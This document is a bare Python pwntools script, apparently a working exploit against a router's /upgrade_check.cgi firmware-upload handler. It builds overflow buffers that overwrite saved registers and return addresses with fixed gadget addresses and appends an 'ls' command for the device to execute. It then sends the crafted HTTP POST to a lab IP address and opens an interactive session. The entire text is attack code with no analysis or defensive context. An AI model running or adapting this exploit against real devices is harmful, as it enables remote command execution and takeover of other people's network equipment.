from pwn import *

data1 = "*#$^"
data1 += "\x00\x00\x08\x00"
data1 = data1.ljust(0x64, 'A')
data1 += p32(0) # r4
data1 += p32(0) # r5
data1 += p32(0) # r6
data1 += p32(0) # r7
data1 += p32(0) # r8
data1 += p32(0x00042098) # ra

data2 = 'a'*0x84
data2 += p32(0)*6 + p32(0x00013CC8) # ra
data2 = data2.ljust(0x110,'B') + 'ls\x00'

payload = ''
payload += 'POST /upgrade_check.cgi HTTP/1.1\r\n'
payload += 'Host: 192.168.124.141\r\n'
payload += 'Content-Disposition: AAAA\r\n'
payload += 'Content-Length: {}\r\n'.format(len(data1)+len(data2)+1)
payload += 'Content-Type: application/octet-stream\r\n'
payload += 'name=\"mtenFWUpload\"\r\n'
payload += '\r\n'
payload += data1 + data2

print(payload)

p = remote('192.168.124.141',80)
p.send(payload)
p.send('a'*0x400)
p.interactive()